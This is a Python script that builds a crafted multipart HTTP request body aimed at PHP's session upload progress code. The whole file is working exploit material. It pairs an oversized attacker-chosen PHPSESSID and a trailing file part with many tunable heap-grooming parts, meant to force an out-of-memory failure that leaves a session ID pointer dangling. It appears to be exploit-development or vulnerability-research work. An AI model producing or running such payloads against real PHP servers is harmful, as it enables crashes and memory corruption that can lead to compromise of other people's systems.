#!/usr/bin/env python3
"""A1 variant: large attacker-chosen PHPSESSID + a file part AFTER the progress field.

The trailing file part fires MULTIPART_EVENT_FILE_START with sid+key set, which
adopts the POST PHPSESSID value as PS(id) and then calls php_session_initialize
-> php_session_send_cookie -> php_url_encode(PS(id)). With a large sid this is a
multi-page allocation that can OOM inside initialize (before session_status is
set active), leaving PS(id) dangling.
"""
import argparse


def nest_name(i, depth, key_pad):
    return ("files[R%05d%s]" % (i, "K" * key_pad)).encode() + b"[a]" * (depth - 2)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", required=True)
    ap.add_argument("--parts", type=int, default=859)
    ap.add_argument("--depth", type=int, default=64)
    ap.add_argument("--key-pad", type=int, default=90)
    ap.add_argument("--fillers128", type=int, default=14)
    ap.add_argument("--filler-len", type=int, default=103)
    ap.add_argument("--filler-value-len", type=int, default=8)
    ap.add_argument("--big", type=int, default=78)
    ap.add_argument("--pre-tail", type=int, default=0)
    ap.add_argument("--pre-tail-name-len", type=int, default=80)
    ap.add_argument("--pre-tail-value-len", type=int, default=80)
    ap.add_argument("--big-len", type=int, default=8000)
    ap.add_argument("--big-shrink", type=int, default=0)
    ap.add_argument("--burners", type=int, default=34)
    ap.add_argument("--burner-len", type=int, default=4000)
    ap.add_argument("--progress-len", type=int, default=4000)
    ap.add_argument("--drain112", type=int, default=0)
    ap.add_argument("--drain256", type=int, default=0)
    ap.add_argument("--drain256-len", type=int, default=210)
    ap.add_argument("--drain256-nest", type=int, default=0)
    ap.add_argument("--drain112-len", type=int, default=80)
    ap.add_argument("--drain112-nest", type=int, default=0)
    ap.add_argument("--sid-len", type=int, default=4000)
    ap.add_argument("--sid-char", default="A")
    ap.add_argument("--sid-nul-first", action="store_true")
    ap.add_argument("--tail-file", type=int, default=1)
    ap.add_argument("--tail-file-name-len", type=int, default=2)
    ap.add_argument("--tail-file-filename-len", type=int, default=1)
    ap.add_argument("--tail", type=int, default=0)
    ap.add_argument("--tail-nest", type=int, default=0)
    ap.add_argument("--tail-nest-depth", type=int, default=2)
    ap.add_argument("--tail-key-len", type=int, default=80)
    ap.add_argument("--tail-name-len", type=int, default=35)
    ap.add_argument("--tail-value-len", type=int, default=0)
    ap.add_argument("--boundary", default="C" * 10)
    a = ap.parse_args()

    b = a.boundary.encode()
    out = bytearray()

    def part(name, value=b"", filename=None, ctype=None):
        out.extend(b"--" + b + b"\r\nContent-Disposition: form-data; name=\"" + name + b"\"")
        if filename is not None:
            out.extend(b"; filename=\"" + filename + b"\"")
        out.extend(b"\r\n")
        if ctype is not None:
            out.extend(b"Content-Type: " + ctype + b"\r\n")
        out.extend(b"\r\n" + value + b"\r\n")

    sid_val = ((b"\x00" if a.sid_nul_first else b"") +
               (a.sid_char * a.sid_len).encode())
    part(b"PHPSESSID", sid_val)
    for i in range(a.parts):
        is0 = i == 0
        is1 = i == 1
        ctype = b"C" * 103 if is0 else (b"C" * 231 if is1 else b"application/octet-stream")
        out.extend(b"--" + b + b"\r\nContent-Disposition: form-data; name=\"" +
                   nest_name(i, a.depth, a.key_pad) + b"\"")
        if is0 or is1:
            out.extend(b"; filename=\"A\"")
        else:
            out.extend(b"; filename=\"\"")
        out.extend(b"\r\nContent-Type: " + ctype + b"\r\n\r\n")
    for i in range(a.fillers128):
        part(("f%04d" % i).encode().ljust(a.filler_len, b"x")[:a.filler_len], b"v" * a.filler_value_len)
    for i in range(a.pre_tail):
        nm = ("p%02d" % i).encode().ljust(a.pre_tail_name_len, b"p")[:a.pre_tail_name_len]
        part(nm, b"P" * a.pre_tail_value_len)
    for i in range(a.big):
        blen = a.big_len - (a.big_shrink if i == a.big - 1 else 0)
        part(("b%04d" % i).encode(), b"B" * blen)
    for i in range(a.burners):
        part(("u%02d" % i).encode(), b"U" * a.burner_len)
    for i in range(a.drain112):
        if a.drain112_nest:
            nm = ("d%04d" % i).encode() + (b"[" + b"K" * a.drain112_len + b"]") * a.drain112_nest
            part(nm, b"D" * a.drain112_len)
        else:
            part(("d%04d" % i).encode(), b"D" * a.drain112_len)
    for i in range(a.drain256):
        if a.drain256_nest:
            nm = ("e%04d[" % i).encode() + b"K" * a.drain256_len + b"]"
            part(nm, b"E" * a.drain256_len)
        else:
            part(("e%04d" % i).encode(), b"E" * a.drain256_len)
    part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * a.progress_len)
    for i in range(a.tail):
        name = ("t%02d" % i).encode().ljust(a.tail_name_len, b"t")[:a.tail_name_len]
        if i >= a.tail - a.tail_nest:
            name = name + (b"[" + b"K" * a.tail_key_len + b"]") * a.tail_nest_depth
        part(name, b"T" * a.tail_value_len)
    for i in range(a.tail_file):
        nm = ("z%02d" % i).encode().ljust(a.tail_file_name_len, b"z")[:a.tail_file_name_len]
        fn = b"A".ljust(a.tail_file_filename_len, b"F")[:a.tail_file_filename_len]
        part(nm, b"", filename=fn, ctype=b"application/octet-stream")
    out.extend(b"--" + b + b"--\r\n")
    open(a.out, "wb").write(bytes(out))
    print("body=%d" % len(out))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
